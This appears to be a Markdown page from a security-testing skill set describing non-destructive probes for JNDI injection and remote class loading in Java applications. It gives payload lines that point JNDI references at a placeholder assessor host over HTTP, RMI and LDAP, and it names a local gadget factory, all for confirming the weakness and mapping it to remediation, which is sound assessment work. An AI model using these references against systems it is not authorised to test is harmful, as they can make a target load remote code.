# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`jndi-injection-remote-class-loading`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `jndi-injection-remote-class-loading`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Codebase-trust differential

**Expected differential:** a reference whose factory specifies a remote codebase URL causes a .class fetch only when trustURLCodebase is true; a local-factory reference is the control

```text
reference factory codebase = http://<assessor-controlled-host>/F.class
reference factory = a local javax.naming factory (control)
```

### Local-factory fallback probe

**Expected differential:** on a modern JDK a reference naming a local gadget factory instantiates while a remote-codebase reference is ignored, locating which trust path is open

```text
factory=org.apache.naming.factory.BeanFactory (local gadget)
factory=com.example.SafeFactory (control)
```

### RMI versus LDAP callback oracle

**Expected differential:** rmi and ldap references each produce a distinct outbound connection; the one that connects shows which provider the context resolves

```text
ref=rmi://<assessor-controlled-host>:1099/Obj
ref=ldap://<assessor-controlled-host>:389/cn=Obj
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
